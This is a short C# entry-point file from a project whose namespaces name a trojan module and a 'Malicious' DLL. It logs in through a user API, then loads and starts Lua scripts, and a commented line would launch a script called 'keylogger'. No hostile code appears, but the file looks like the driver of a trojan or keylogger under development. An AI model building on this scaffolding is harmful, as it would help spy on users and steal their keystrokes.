using Cerberus.Domain.ApiService.ApiService;
using Cerberus.Domain.Models.Person;
using Cerberus.Presentation.Trojan.Core;

public class Program
{

    //[DllImport("Cerberus.Malicious.dll", CallingConvention = CallingConvention.Cdecl)]
    //public static extern int testMan();

    private static async Task Main(string[] args)
    {

        UserApiService userService = new UserApiService();

        User user = await userService.GetUserByLogin("string", "string"); 

        Console.WriteLine("TESTANDO:" + user.Name);

        LuaScriptManager _scriptManager = new LuaScriptManager();
        _scriptManager.LoadScripts();

        _scriptManager.StartScript("luaok");

        //_ = _scriptManager.StartScriptAsync("luaok");
        //_ = await _scriptManager.StartScriptAsync("keylogger");

    }
}